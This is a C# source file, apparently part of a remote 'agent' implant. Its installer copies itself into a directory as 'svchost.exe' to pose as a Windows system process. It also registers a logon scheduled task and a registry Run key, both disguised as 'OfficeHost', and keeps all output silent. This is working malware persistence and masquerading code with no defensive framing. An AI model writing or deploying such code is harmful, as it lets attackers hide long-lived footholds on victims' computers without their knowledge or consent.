using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;

namespace Libra.Agent.Helper
{
    internal class Installer
    {
        public static async Task InstallAgentAsync(string destDirectory)
        {
            try
            {
                if (!Directory.Exists(destDirectory))
                {
                    Directory.CreateDirectory(destDirectory);
                }

                string destPath = Path.Combine(destDirectory, "svchost.exe");

                if (!File.Exists(destPath))
                {
                    File.Copy(Environment.ProcessPath, destPath);
                }

                await SetTaskSchedulerAsync(destPath);
                if (IsRunAsAdministrator())
                {
                    SetRegistryStartup(destPath);
                }

                //D Console.WriteLine("Agent已成功安装并设置为开机自启动.");
            }
            catch (Exception ex)
            {
                //D Console.WriteLine($"安装失败: {ex.Message}");
            }
        }

        private static Task SetTaskSchedulerAsync(string exePath)
        {
            return Task.Run(() =>
            {
                string command = $"/create /tn \"OfficeHost\" /tr \"{exePath}\" /sc onlogon /f";
                ExecuteCommand("schtasks", command);
            });
        }

        private static void ExecuteCommand(string command, string args)
        {
            try
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = command;
                    process.StartInfo.Arguments = args;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                //D Console.WriteLine($"执行命令失败: {ex.Message}");
            }
        }

        private static void SetRegistryStartup(string exePath)
        {
            try
            {
                string registryKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKeyPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue("OfficeHost", exePath);
                        //D Console.WriteLine("注册表已成功设置自启动.");
                    }
                    else
                    {
                        //D Console.WriteLine("无法打开注册表键值.");
                    }
                }
            }
            catch (Exception ex)
            {
                //D Console.WriteLine($"设置注册表自启动失败: {ex.Message}");
            }
        }
        private static bool IsRunAsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            // 判断当前用户是否是管理员
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}